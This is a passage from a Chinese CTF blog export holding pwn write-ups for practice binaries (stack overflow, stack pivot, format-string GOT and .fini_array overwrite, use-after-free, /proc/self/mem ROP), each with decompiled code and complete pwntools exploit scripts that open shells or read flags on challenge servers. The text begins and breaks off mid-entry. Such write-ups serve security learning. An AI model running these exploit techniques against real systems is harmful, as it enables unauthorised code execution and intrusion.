sub_80486A4;  v3[9] = sub_80486B8;  puts(&quot;What is your name?&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  fgets(s, 0x20, stdin);  sub_80485DD(s);  fflush(stdout);  printf(&quot;I should give you a pointer perhaps. Here: %x\\n\\n&quot;, sub_8048654);  fflush(stdout);  puts(&quot;Enter the string to be validate&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  __isoc99_scanf(&quot;%s&quot;, v2);  for ( i = 0; ; ++i )  &#123;    v0 = i;    if ( v0 &gt;= strlen(v2) )      break;    switch ( v5 )    &#123;      case 1:        if ( sub_8048702(v2[i]) )          v5 = 2;        break;      case 2:        if ( v2[i] == 64 )          v5 = 3;        break;      case 3:        if ( sub_804874C(v2[i]) )          v5 = 4;        break;      case 4:        if ( v2[i] == 46 )          v5 = 5;        break;      case 5:        if ( sub_8048784(v2[i]) )          v5 = 6;        break;      case 6:        if ( sub_8048784(v2[i]) )          v5 = 7;        break;      case 7:        if ( sub_8048784(v2[i]) )          v5 = 8;        break;      case 8:        if ( sub_8048784(v2[i]) )          v5 = 9;        break;      case 9:        v5 = 10;        break;      default:        continue;    &#125;  &#125;  (v3[--v5])();  return fflush(stdout);&#125;\n\n内部的其他函数基本就是这样一个判断\n_BOOL4 __cdecl sub_8048702(char a1)&#123;  return a1 &gt; 96 &amp;&amp; a1 &lt;= 122 || a1 &gt; 47 &amp;&amp; a1 &lt;= 57 || a1 == 95 || a1 == 45 || a1 == 43 || a1 == 46;&#125;\n\n还有一个已经被我改名字的函数可以直接拿到flag\nint get_flag()&#123;  char s[58]; // [esp+1Eh] [ebp-3Ah] BYREF  snprintf(s, 0x32u, &quot;cat %s&quot;, &quot;./flag&quot;);  return system(s);&#125;\n\n代码审计程序存在两处栈溢出\nfgets(s, 0x20, stdin);  // 第一处sub_80485DD(s);fflush(stdout);printf(&quot;I should give you a pointer perhaps. Here: %x\\n\\n&quot;, sub_8048654);fflush(stdout);puts(&quot;Enter the string to be validate&quot;);printf(&quot;&gt; &quot;);fflush(stdout);__isoc99_scanf(&quot;%s&quot;, v2);  // 第二处\n\n看完代码逻辑，第一处没什么用，整个程序的意思也就是，输入一串字符，然后在遍历字符，如果字符满足就改变v5但是最终程序执行\n(v3[--v5])();这个，思路很明确，让v3[0]=get_flag_addr然后让v5=1，v5本来就等于所以只需要都return false就行\nexpfrom pwn import *\n\ncontext(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)\n\nelf = ELF(&#39;./questions/d033ab68b3e64913a1b6b1029ef3dc29&#39;)\nr = remote(&#39;111.200.241.244&#39;, 56210)\n\nflag_addr = 0x80486cc\npayload = b&#39;A&#39;*(0x20)+p32(flag_addr)\nr.recvuntil(b&#39;What is your name?\\n&#39;)\nr.sendlineafter(b&#39;&gt;&#39;, &#39;1&#39;)\nr.sendlineafter(b&#39;Enter the string to be validate&#39;, payload)\n\nr.interactive()\n\n","categories":["pwn-xctf"],"tags":["stack-overflow"]},{"title":"format2","url":"/2021/12/02/format2/","content":"检查保护\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [esp+4h] [ebp-3Ch]  int v5; // [esp+18h] [ebp-28h] BYREF  char s[30]; // [esp+1Eh] [ebp-22h] BYREF  unsigned int v7; // [esp+3Ch] [ebp-4h]  memset(s, 0, sizeof(s));  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  printf(&quot;Authenticate : &quot;, v4);  _isoc99_scanf(&quot;%30s&quot;, s);  memset(&amp;input, 0, 0xCu);  v5 = 0;  v7 = Base64Decode(s, &amp;v5);  if ( v7 &gt; 0xC )  &#123;    puts(&quot;Wrong Length&quot;);  &#125;  else  &#123;    memcpy(&amp;input, v5, v7);    if ( auth(v7) == 1 )      correct();  &#125;  return 0;&#125;\n\n_BOOL4 __cdecl auth(int a1)&#123;  char v2[8]; // [esp+14h] [ebp-14h] BYREF  char *s2; // [esp+1Ch] [ebp-Ch]  int v4; // [esp+20h] [ebp-8h] BYREF  memcpy(&amp;v4, &amp;input, a1);  s2 = (char *)calc_md5(v2, 12);  printf(&quot;hash : %s\\n&quot;, s2);  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;&#125;\n\nvoid __noreturn correct()&#123;  if ( input == -559038737 )  &#123;    puts(&quot;Congratulation! you are good!&quot;);    system(&quot;/bin/sh&quot;);  &#125;  exit(0);&#125;\n\n流程分析流程很简单，就是你输入30个字符然后base64decode一下，要是长度小于等于12个字符就可以进行验证，验证通过再检查input是不是和这个-559038737相等就可。但是作为pwn题应该不会让你去像web那样搞这个md5，这道题的漏洞发生在auth里面的复制这个v4会造成栈溢出\n利用分析但是受限于题目输入字符的限制我们只能输入12个有效字符，也就是刚刚覆盖到ebp那个位置就没法继续往后覆盖了。但是这个input是一个全局变量所以考虑栈迁移。直接贴exp了，理解起来很简单\nfrom pwn import *import base64elf = ELF(&#x27;./format2&#x27;)# r = process(&#x27;./format2&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 51941)shell_addr = 0x08049284input_addr = 0x0811EB40r.recvuntil(b&#x27;Authenticate : &#x27;)payload = b&#x27;a&#x27;*0x4 + p32(shell_addr) + p32(input_addr)payload = base64.b64encode(payload)r.sendline(payload)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["栈迁移"]},{"title":"greeting-150","url":"/2021/10/21/greeting-150/","content":"检查保护\n三十二位，开启了Canary\n\n执行结果是这样，猜测可能有格式化字符串\n执行流程分析int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[64]; // [esp+1Ch] [ebp-84h] BYREF  char v5[64]; // [esp+5Ch] [ebp-44h] BYREF  unsigned int v6; // [esp+9Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  printf(&quot;Please tell me your name... &quot;);  if ( !getnline(v5, 64) )    return puts(&quot;Don&#x27;t ignore me ;( &quot;);  sprintf(s, &quot;Nice to meet you, %s :)\\n&quot;, v5);  return printf(s);&#125;\n\n这个getnline是真的长得像libc自带的\nsize_t __cdecl getnline(char *s, int n)&#123;  char *v3; // [esp+1Ch] [ebp-Ch]  fgets(s, n, stdin);  v3 = strchr(s, 10);  if ( v3 )    *v3 = 0;  return strlen(s);&#125;\n\n整体流程就是输入一段字符，然后把字符复制给s然后打印出s，s那里存在明显的格式化字符串漏洞，输入aaaaaa_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p\n\n上面是栈内的情况    \n\n打印的结果，可以看到偏移量是12。而且在getnline函数里面的strlen的调用方式和system一模一样，所以篡改strlen的got表地址到system就可以直接执行了。但是目前还有一个问题就是程序是只存在一处漏洞，并且执行完了就没了，然后思路就断了，看了wp知道：\nmain在执行之前会调用.init段的代码和.init_array段的函数数组的每一个指针，在main执行结束后会调用，.fini段代码和.fini_array段的函数数组的每一个指针\n函数利用过程首先修改strlen的got表为system的plt表，那么调用strlen的时候就是就调用了system，然后修改.fini_array的段指针到main函数，然后就等main执行完之后就会重新进入main在调用getnline的时候输入/bin/sh就可以调用到system(‘/bin/sh’)了，就getshell了。\n.fini_array:08049934 ; ELF Termination Function Table.fini_array:08049934 ; ===========================================================================.fini_array:08049934.fini_array:08049934 ; Segment type: Pure data.fini_array:08049934 ; Segment permissions: Read/Write.fini_array:08049934 _fini_array     segment dword public &#x27;DATA&#x27; use32.fini_array:08049934                 assume cs:_fini_array.fini_array:08049934                 ;org 8049934h.fini_array:08049934 __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux.fini_array:08049934                                         ; DATA XREF: __libc_csu_init+18↑o.fini_array:08049934 _fini_array     ends                    ; Alternative name is &#x27;__init_array_end&#x27;.fini_array:08049934\n\n上面调用的是 __do_global_dtors_aux函数\n.text:080485A0 __do_global_dtors_aux proc near         ; DATA XREF: .fini_array:__do_global_dtors_aux_fini_array_entry↓o.text:080485A0                 cmp     ds:completed_6591, 0.text:080485A7                 jnz     short locret_80485BC.text:080485A9                 push    ebp.text:080485AA                 mov     ebp, esp.text:080485AC                 sub     esp, 8.text:080485AF                 call    deregister_tm_clones.text:080485B4                 mov     ds:completed_6591, 1.text:080485BB                 leave.text:080485BC.text:080485BC locret_80485BC:                         ; CODE XREF: __do_global_dtors_aux+7↑j.text:080485BC                 rep retn\n\n函数的地址是0x080485A0，main函数的地址是0x080485ED发现只有后面四个字节不一样，所以修改后面四个字节就可了。\n解题exp:\nfrom pwn import *\n\nelf = ELF(&#39;./questions/1330703b472c4eaab999ffc141717c64&#39;)\n# r = remote(&#39;111.200.241.244&#39;, 55046)\nr = process(&#39;./questions/1330703b472c4eaab999ffc141717c64&#39;)\n\n_fini_array = 0x8049934\nmain_addr = 0x85ED\nstrlen_got_addr = elf.got[&#39;strlen&#39;]\nsystem_plt_addr = 0x8048490\n\npayload = b&#39;aa&#39;+p32(strlen_got_addr)+p32(strlen_got_addr+2)+p32(_fini_array) + \\\n    b&#39;%&#39;+bytes(str(0x804-0x20), encoding=&#39;utf8&#39;)+b&#39;c%13$hn&#39;+b&#39;%&#39;+bytes(str(0x8490-0x804), encoding=&#39;utf8&#39;) + \\\n    b&#39;c%12$hn&#39;+b&#39;%&#39;+bytes(str(0x85ed-0x8490), encoding=&#39;utf8&#39;)+b&#39;c%14$hn&#39;\nr.recvuntil(b&#39;Please tell me your name... &#39;)\nr.sendline(payload)\n\nr.recvuntil(b&#39;Please tell me your name... &#39;)\nr.sendline(&#39;/bin/sh&#39;)\n\nr.interactive()\n\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"hacknote","url":"/2021/12/20/hacknote/","content":"检查保护\n没有开启PIE。\nvoid __cdecl __noreturn main()&#123;  int v0; // eax  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v2; // [esp+Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      sub_8048956();      read(0, buf, 4u);      v0 = atoi(buf);      if ( v0 != 2 )        break;      sub_80487D4();    &#125;    if ( v0 &gt; 2 )    &#123;      if ( v0 == 3 )      &#123;        sub_80488A5();      &#125;      else      &#123;        if ( v0 == 4 )          exit(0);LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v0 != 1 )        goto LABEL_13;      sub_8048646();    &#125;  &#125;&#125;\n\nunsigned int sub_8048646()&#123;  int v0; // ebx  int i; // [esp+Ch] [ebp-1Ch]  int size; // [esp+10h] [ebp-18h]  char buf[8]; // [esp+14h] [ebp-14h] BYREF  unsigned int v5; // [esp+1Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  if ( dword_804A04C &lt;= 5 )  &#123;    for ( i = 0; i &lt;= 4; ++i )    &#123;      if ( !*(&amp;ptr + i) )      &#123;        *(&amp;ptr + i) = malloc(8u);        if ( !*(&amp;ptr + i) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        **(&amp;ptr + i) = sub_804862B;        printf(&quot;Note size :&quot;);        read(0, buf, 8u);        size = atoi(buf);        v0 = *(&amp;ptr + i);        *(v0 + 4) = malloc(size);        if ( !*(*(&amp;ptr + i) + 1) )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        printf(&quot;Content :&quot;);        read(0, *(*(&amp;ptr + i) + 1), size);        puts(&quot;Success !&quot;);        ++dword_804A04C;        return __readgsdword(0x14u) ^ v5;      &#125;    &#125;  &#125;  else  &#123;    puts(&quot;Full&quot;);  &#125;  return __readgsdword(0x14u) ^ v5;&#125;\n\nunsigned int sub_80487D4()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + v1) )  &#123;    free(*(*(&amp;ptr + v1) + 1));    free(*(&amp;ptr + v1));    puts(&quot;Success&quot;);  &#125;  return __readgsdword(0x14u) ^ v3;&#125;\n\nunsigned int sub_80488A5()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= dword_804A04C )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;ptr + v1) )    (**(&amp;ptr + v1))(*(&amp;ptr + v1));  return __readgsdword(0x14u) ^ v3;&#125;\n\n流程分析题目流程很简单，就是一道菜单题目，创建chunk的时候不存在堆溢出，但是释放chunk之后又没有清除指针，很明显的UAF\n利用分析首先随便创建三个chunk，然后再创建一个大小为0x8的chunk，这时候我们可以控制的chunk就是每一次自动创建的chunk，再利用sub_80488A5这个函数即可。题目很简单直接给exp\nexpfrom pwn import *elf = ELF(&#x27;./hacknote&#x27;)libc = ELF(&#x27;./libc_32.so.6&#x27;)r = process(&#x27;./hacknote&#x27;)# r = remote(&#x27;111.200.241.244&#x27;, 49789)context.log_level = &#x27;debug&#x27;def create(size, content):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Note size :&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content :&#x27;)    r.send(content)def delete(id):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index :&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def show(id):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index :&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def exit():    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;4&#x27;)create(0x20, b&#x27;a&#x27;*0x20)create(0x20, b&#x27;b&#x27;*0x20)create(0x20, b&#x27;b&#x27;*0x20)delete(0)delete(1)puts_addr = 0x804862Bputs_got = elf.got[&#x27;puts&#x27;]payload = p32(puts_addr)+p32(puts_got)create(0x8, payload)show(0)puts_real_addr = u32(r.recv(4))libc_base = puts_real_addr-libc.symbols[&#x27;puts&#x27;]system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))delete(3)print(system_addr)print(bin_sh_addr)payload = p32(system_addr)+b&#x27;||sh&#x27;create(0x8, payload)# gdb.attach(r)show(0)r.interactive()\n\n解释一下为什么使用||sh而不是用bin_sh_addr，我一开始也是一直想不通。\nif ( *(&amp;ptr + v1) )  (**(&amp;ptr + v1))(*(&amp;ptr + v1));return __readgsdword(0x14u) ^ v3;\n\n我们执行的是show函数的这一句\n可以看到虽然我们构造的是sub_804862B这个函数的地址和puts的got表，但是我们下面都已经输出了我们recv的地址但是上面0x2d前面还存在其他数据，就是因为我们执行的参数并不是只是got表，是chunk的那一坨都要执行。\n所以我们最终的payload其实是执行system(note)，参数就是地址+||sh地址是肯定执行失败的所以会执行sh\n","categories":["pwn-xctf"],"tags":["UAF"]},{"title":"house_of_grey","url":"/2022/01/05/house-of-grey/","content":"/procLinux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。\n可以看到效果类似与gdb的vmmap。\n检查保护\n保护全开\n流程分析void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  char buf; // [rsp+1Bh] [rbp-25h] BYREF  int stat_loc; // [rsp+1Ch] [rbp-24h] BYREF  int fd; // [rsp+20h] [rbp-20h]  __pid_t pid; // [rsp+24h] [rbp-1Ch]  __int64 v7; // [rsp+28h] [rbp-18h] BYREF  char *v8; // [rsp+30h] [rbp-10h]  unsigned __int64 v9; // [rsp+38h] [rbp-8h]  v9 = __readfsqword(0x28u);  sub_F35(a1, a2, a3);  puts(&quot;Welcome to my house! Enjoy yourself!\\n&quot;);  puts(&quot;Do you want to help me build my room? Y/n?&quot;);  read(0, &amp;buf, 4uLL);  if ( buf == 121 || buf == 89 )  &#123;    fd = open(&quot;/dev/urandom&quot;, 0);    if ( fd &lt; 0 )    &#123;      perror(&quot;open&quot;);      exit(1);    &#125;    read(fd, &amp;v7, 8uLL);    close(fd);    v7 &amp;= 0xFFFFF0u;    v8 = (char *)mmap(0LL, 0x10000000uLL, 3, 131106, -1, 0LL);    if ( v8 == (char *)-1LL )    &#123;      perror(&quot;mmap&quot;);      exit(1);    &#125;    pid = clone(fn, &amp;v8[v7], 256, 0LL);    if ( pid == -1 )    &#123;      perror(&quot;clone&quot;);      exit(1);    &#125;    waitpid(pid, &amp;stat_loc, 0x80000000);    if ( (stat_loc &amp; 0x7F) != 0 )      puts(&quot;\\nMaybe something wrong? Build failed!&quot;);    else      puts(&quot;\\nBuild finished! Thanks a lot!&quot;);    exit(0);  &#125;  puts(&quot;You don&#x27;t help me? OK, just get out of my hosue!&quot;);  exit(0);&#125;\n\n首先是创建映射，然后将将映射的随机部分当作fn函数的堆栈区\nvoid __fastcall fn(void *arg)&#123;  unsigned __int64 v1; // rsi  int fd; // [rsp+10h] [rbp-70h]  int i; // [rsp+14h] [rbp-6Ch]  int v4; // [rsp+1Ch] [rbp-64h]  int v5; // [rsp+1Ch] [rbp-64h]  void *v6; // [rsp+20h] [rbp-60h]  char buf[24]; // [rsp+30h] [rbp-50h] BYREF  void *v8; // [rsp+48h] [rbp-38h]  char nptr[40]; // [rsp+50h] [rbp-30h] BYREF  unsigned __int64 v10; // [rsp+78h] [rbp-8h]  v10 = __readfsqword(0x28u);  puts(&quot;You get into my room. Just find something!\\n&quot;);  v6 = malloc(0x186A0uLL);  if ( !v6 )  &#123;    perror(&quot;malloc&quot;);    exit(1);  &#125;  if ( (unsigned int)sub_14D2() )    exit(1);  v8 = v6;  for ( i = 0; i &lt;= 29; ++i )  &#123;    switch ( (unsigned int)sub_FEE() )    &#123;      case 1u:        puts(&quot;So man, what are you finding?&quot;);        buf[(int)(read(0, buf, 0x28uLL) - 1)] = 0;        if ( (unsigned int)sub_FA6(buf) )        &#123;          puts(&quot;Man, don&#x27;t do it! See you^.&quot;);          exit(1);        &#125;        fd = open(buf, 0);        if ( fd &lt; 0 )        &#123;          perror(&quot;open&quot;);          exit(1);        &#125;        return;      case 2u:        puts(&quot;So, Where are you?&quot;);        read(0, nptr, 0x20uLL);        v1 = strtoull(nptr, 0LL, 10);        lseek(fd, v1, 0);        break;      case 3u:        puts(&quot;How many things do you want to get?&quot;);        read(0, nptr, 8uLL);        v4 = atoi(nptr);        if ( v4 &lt;= 100000 )        &#123;          v5 = read(fd, v8, v4);          if ( v5 &lt; 0 )          &#123;            puts(&quot;error read&quot;);            perror(&quot;read&quot;);            exit(1);          &#125;          puts(&quot;You get something:&quot;);          write(1, v8, v5);        &#125;        else        &#123;          puts(&quot;You greedy man!&quot;);        &#125;        break;      case 4u:        puts(&quot;What do you want to give me?&quot;);        puts(&quot;content: &quot;);        read(0, v8, 0x200uLL);        break;      case 5u:        exit(0);      default:        continue;    &#125;  &#125;  puts(&quot;\\nI guess you don&#x27;t want to say Goodbye!&quot;);  puts(&quot;But sadly, bye! Hope you come again!\\n&quot;);  exit(0);&#125;\n\n这里四个功能就是，第一个：输入要读的文件名，第二个：改变便宜指针，第三个：获取文件内容，第四个：输入数据\n漏洞：buf存在缓冲区溢出可以覆盖v8指针导致任意地址写\n利用分析利用读取任意文件读取/proc/self/maps然后获得程序加载基地址，再者就是获取自己创建的映射关系\n\nfind(b&#x27;/proc/self/maps&#x27;)get()r.recvuntil(b&#x27;You get something:\\n&#x27;)process_base = int(r.recvuntil(b&#x27;-&#x27;, drop=True), 16)success(&quot;process_base:&quot;+hex(process_base))puts_addr = process_base+puts_pltread_addr = process_base+read_pltopen_addr = process_base+open_pltpop_rdi_addr = process_base+pop_rdipop_rsi_r15_addr = process_base+pop_rsi_r15r.recvuntil(b&#x27;[heap]\\n&#x27;)stack_arr = str(r.recvuntil(b&#x27; rw-p &#x27;, drop=True), encoding=&#x27;utf-8&#x27;).split(&#x27;-&#x27;)print(stack_arr)stack_start = int(stack_arr[0], 16)success(&quot;stack_start:&quot;+hex(stack_start))stack_end = int(stack_arr[1], 16)print(&quot;stack_start:&quot;+hex(stack_start))print(&quot;stack_end:&quot;, hex(stack_end))\n\n接着思路就是利用mem劫持执行流，但是在看ida的代码\n\n程序都是以exit(0)结束，导致在fn我们无法进行ROP。所以思路就是我们覆盖掉read函数的ret地址来进行ROP。\n首先需要确定read的ret地址，但是我们连这个上面存放的什么都不知道所以很难操作，所以我们选择寻找buf的位置。\nfind(b&#x27;/proc/self/mem&#x27;)locate(stack_start)for i in range(24):    get()    r.recvuntil(b&#x27;You get something:\\n&#x27;)# 这一句千万别忘了，我就是忘了找一句导致一直跑不出来。    content = r.recvuntil(b&#x27;\\n1.Find something&#x27;, drop=True)    if b&#x27;/proc/self/mem&#x27; in content:        success(&#x27;OK!!!&#x27;)        buf_addr = len(content.split(b&#x27;/proc/self/mem&#x27;)                       [0])+i*100000+stack_start        break    elif i==23:        log.failure(&#x27;NO!!!&#x27;)        exit(0)\n\n其实buf地址的计算式很好就可以理解。\n但是光知道buf地址我们还是没法进行ROP。所以下一步就是求read的ret地址\n\n可以看到buf距离rsp的地址其实是0x30，但是在执行call _read指令时会执行push ip这条命令，执行完ret也就是pop ip。所以push进去之后rsp又会降低8个字节。所以此时read的ret地址距离buf的地址是0x38(以上是我个人对于0x38的猜测，因为其他博客并没有说清楚，可能是觉得太简单了，有错误欢迎大家在下方留言评论)。\n所以获得ret地址的代码也就是在上面加点小改动\nfind(b&#x27;/proc/self/mem&#x27;)locate(stack_start)for i in range(24):    get()    r.recvuntil(b&#x27;You get something:\\n&#x27;)    content = r.recvuntil(b&#x27;\\n1.Find something&#x27;, drop=True)    if b&#x27;/proc/self/mem&#x27; in content:        success(&#x27;OK!!!&#x27;)        buf_addr = len(content.split(b&#x27;/proc/self/mem&#x27;)                       [0])+i*100000+stack_start        ret_addr = buf_addr-0x38        break    elif i == 23:        log.failure(&#x27;NO!!!&#x27;)        exit(0)\n\n最后就是利用任意地址写构建ROP了，但是程序禁止了execve所以没法system这种了，选择open-&gt;read-&gt;puts就好了\n\nexpfrom pwn import *elf = ELF(&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;)# r = process(&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 50398)context.log_level = &#x27;debug&#x27;pop_rdi = 0x0000000000001823pop_rsi_r15 = 0x0000000000001821open_plt = elf.plt[&#x27;open&#x27;]read_plt = elf.plt[&#x27;read&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]def find(name):    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;So man, what are you finding?&#x27;)    r.sendline(name)def locate(pos):    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;So, Where are you?&#x27;)    r.sendline(bytes(str(pos), encoding=&#x27;utf-8&#x27;))def get():    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;How many things do you want to get?&#x27;)    r.sendline(b&#x27;100000&#x27;)def give(content):    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)r.recvuntil(b&#x27;Do you want to help me build my room? Y/n?&#x27;)r.sendline(b&#x27;y&#x27;)find(b&#x27;/proc/self/maps&#x27;)get()r.recvuntil(b&#x27;You get something:\\n&#x27;)process_base = int(r.recvuntil(b&#x27;-&#x27;, drop=True), 16)success(&quot;process_base:&quot;+hex(process_base))puts_addr = process_base+puts_pltread_addr = process_base+read_pltopen_addr = process_base+open_pltpop_rdi_addr = process_base+pop_rdipop_rsi_r15_addr = process_base+pop_rsi_r15r.recvuntil(b&#x27;[heap]\\n&#x27;)stack_arr = str(r.recvuntil(b&#x27; rw-p &#x27;, drop=True), encoding=&#x27;utf-8&#x27;).split(&#x27;-&#x27;)print(stack_arr)stack_start = int(stack_arr[0], 16)success(&quot;stack_start:&quot;+hex(stack_start))stack_end = int(stack_arr[1], 16)print(&quot;stack_start:&quot;+hex(stack_start))print(&quot;stack_end:&quot;, hex(stack_end))find(b&#x27;/proc/self/mem&#x27;)locate(stack_start)for i in range(24):    get()    r.recvuntil(b&#x27;You get something:\\n&#x27;)    content = r.recvuntil(b&#x27;\\n1.Find something&#x27;, drop=True)    if b&#x27;/proc/self/mem&#x27; in content:        success(&#x27;OK!!!&#x27;)        buf_addr = len(content.split(b&#x27;/proc/self/mem&#x27;)                       [0])+i*100000+stack_start        ret_addr = buf_addr-0x38        break    elif i == 23:        log.failure(&#x27;NO!!!&#x27;)        exit(0)find(b&#x27;/proc/self/mem&#x27;.ljust(0x18, b&#x27;\\x00&#x27;)+p64(ret_addr))flag_addr = ret_addr+8*15payload = p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \\    p64(0)+p64(0)+p64(open_addr)payload += p64(pop_rdi_addr)+p64(6)+p64(pop_rsi_r15_addr) + \\    p64(flag_addr)+p64(0)+p64(read_addr)payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(puts_addr)payload += b&#x27;/home/ctf/flag\\x00&#x27;give(payload)r.interactive()\n\n参考博客https://blog.csdn.net/getsum/article/details/104096038\n","categories":["pwn-xctf"],"tags":["/proc"]},{"title":"nobug","url":"/2022/01/01/nobug/","content":"以前以为非栈上的格式化字符串应该跟栈上的差不多所以就没怎么去了解，可以说是完全没学非栈上的格式化字符串。\n%n\n在上图的红色框中存在一条链假定为p1-&gt;p2-&gt;p3-&gt;p4，我们都知道在gdb中第一列为地址，第二列为值，而第三列则是指针所指向的值。而%n实际上就是修改其第三列，就跟scanf(&quot;%d&quot;,&amp;n);同理。\n所以最终的效果就是我们使用%n修改值修改的是p3。下面回到题目。\n检查保护\n几乎什么都没开，重要的是没开nx保护，可以直接写shellcode。这次程序的代码有点长就不放上来了，存在这样一个函数sub_804869D，看起来很复杂还很长，我也不知道是什么看了wp发现是一个base64_decode。\n流程分析int sub_8048B76()&#123;  size_t v0; // eax  const char *v1; // eax  v0 = strlen(s);  v1 = sub_804869D(s, v0, 0);  return snprintf(byte_804A8A0, 0x800u, &quot;%s&quot;, v1);&#125;\n\n在输入完内容解密之后打印出来还没发现问题。\nint sub_8048B32()&#123;  size_t v0; // eax  const char *v1; // eax  v0 = strlen(s);  v1 = sub_804869D(s, v0, 0);  return snprintf(byte_804A8A0, 0x800u, v1);&#125;\n\n在这个函数发现了存在格式化字符串漏洞。但是看了一圈没找到什么地方会往这个函数执行。去看和漏洞函数很相似的上面那个函数的汇编代码的时候发现了\n.text:08048B76 sub_8048B76     proc near               ; CODE XREF: sub_8048BD4+6↓p.text:08048B76 ; __unwind &#123;.text:08048B76                 push    ebp.text:08048B77                 mov     ebp, esp.text:08048B79                 sub     esp, 18h.text:08048B7C                 mov     dword ptr [esp], offset s ; s.text:08048B83                 call    _strlen.text:08048B88                 mov     dword ptr [esp+8], 0.text:08048B90                 mov     [esp+4], eax.text:08048B94                 mov     dword ptr [esp], offset s.text:08048B9B                 call    sub_804869D.text:08048BA0                 mov     [esp+0Ch], eax.text:08048BA4                 mov     dword ptr [esp+8], offset format ; &quot;%s&quot;.text:08048BAC                 mov     dword ptr [esp+4], 800h ; maxlen.text:08048BB4                 mov     dword ptr [esp], offset byte_804A8A0 ; s.text:08048BBB                 call    _snprintf.text:08048BC0                 push    offset sub_8048BD1.text:08048BC5                 push    offset sub_8048B32.text:08048BCA                 push    0.text:08048BCC                 lea     esp, [esp+4].text:08048BD0                 retn\n\n下面几行会将sub_8048B32推进栈里，然后下面还有个lea正好吧esp改变过去了，所以是一定会去执行sub_8048B32这个函数的。\n在执行完sub_8048B32会发生什么？\n\n\n可以看到程序是利用了类似于ROP的思想进行的。\n利用分析\n发现疑似可利用的地方，马上调试程序\n\n 这就是刚刚找的东西，但是直接利用肯定不行。所以我们要构造出来p1-&gt;p2-&gt;p3的结构\n\n很容易可以看到ebp存在这样一条链子，0xffffce08也存在，我们若是让0xffffce08的值等于0xffffce0c那我们岂不是就构成了这样一条链子？\n0xffffce08-&gt;0xffffce0c-&gt;0x8048bdf这时候修改0x8048bdf到shellcode的地址就可以了。\n已知ebp为%4$，再结合文章开头所说的，那么我们就可以通过%4$修改%12$的值为%13$，然后利用%12$修改%13$的值为我们的shellcode。\nexpfrom pwn import *import base64elf = ELF(&#x27;./4f59876cebb1469ca62254c162306aa5&#x27;)# r = process(&#x27;./4f59876cebb1469ca62254c162306aa5&#x27;)r = 